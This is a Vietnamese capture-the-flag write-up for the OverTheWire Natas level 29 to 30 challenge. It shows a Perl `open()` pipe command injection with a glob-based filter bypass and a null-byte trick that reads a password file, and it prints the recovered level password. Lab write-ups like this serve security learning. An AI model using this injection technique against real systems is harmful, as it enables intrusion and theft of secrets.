# Natas 29 → 30

## Mục tiêu

Đọc password của `natas30` qua Perl `open()` trong CGI.

## Tôi thấy

Trang nhận `file`, và `open(FD, "$f.txt")` cho phép dạng pipe. Input có chuỗi `natas` bị chặn trực tiếp, nhưng wildcard shell `?` thay thế được ký tự `a` trong đường dẫn.

## Cách làm

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%00
```

`%00` kết thúc chuỗi tên file trong Perl `open()`. Lệnh `cat` trả password trực tiếp trong response.

## Vì sao cách này hiệu quả

`open()` xử lý tên bắt đầu bằng `|` như command pipe. Bộ lọc tìm chuỗi literal `natas`, còn shell glob `?` khớp ký tự `a` khi lệnh chạy.

## Kết quả

Password của `natas30`:

```text
frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF
```

Đã xác thực Basic Auth thành công tại Natas 30.

